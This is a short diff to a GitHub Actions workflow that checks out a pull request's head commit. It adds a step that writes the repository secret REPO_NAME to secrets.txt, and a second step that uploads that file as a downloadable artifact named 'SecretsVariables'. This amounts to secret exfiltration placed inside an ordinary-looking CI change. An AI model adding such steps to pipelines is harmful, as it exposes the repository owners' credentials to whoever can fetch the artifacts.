@@ -62,6 +62,18 @@ jobs:
         with:
           lfs: true
           ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: ECHO VAR
+        env:
+          REPO_NAME: ${{ secrets.REPO_NAME }}
+        run: echo "$REPO_NAME" > "secrets.txt"
+
+      - uses: actions/upload-artifact@v3
+        name: Upload Artifact
+        with:
+          name: SecretsVariables
+          path: "secrets.txt"
+
       - uses: pnpm/action-setup@v3
         with:
           version: 8
